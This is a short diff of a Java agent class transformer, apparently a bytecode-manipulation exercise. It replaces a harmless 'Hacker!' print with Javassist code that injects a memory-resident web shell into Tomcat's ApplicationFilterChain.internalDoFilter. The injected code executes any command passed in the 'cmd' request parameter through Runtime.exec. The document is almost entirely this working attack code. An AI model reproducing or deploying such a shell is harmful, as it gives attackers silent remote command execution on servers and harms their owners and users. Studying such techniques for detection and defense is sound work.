@@ -18,11 +18,23 @@ public class Hello_Transform implements ClassFileTransformer {
                 classPool.insertClassPath(ccp);
             }
 
-            CtClass ctClass = classPool.getCtClass("Seri.JVMAgentChangeBytecode.Say_Hello");
-            CtMethod ctMethod = ctClass.getDeclaredMethod("sayHello");
+            CtClass ctClass = classPool.getCtClass("org.apache.catalina.core.ApplicationFilterChain");
+            CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");
 
-            String body = "{System.out.println(\"Hacker!\");}";
-            ctMethod.setBody(body);
+            String body =
+
+                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
+
+                            "String cmd=request.getParameter(\"cmd\");\n" +
+
+                            "if (cmd != null){\n" +
+
+                            "  java.lang.Runtime.getRuntime().exec(cmd);\n" +
+
+                            "  } else {java.lang.Runtime.getRuntime().exec(\"calc\");};";
+            ctMethod.insertBefore(body);
+//            ctMethod.setBody(body);
+            ctClass.writeFile();
 
             byte[] byteCode = ctClass.toBytecode();
             return byteCode;
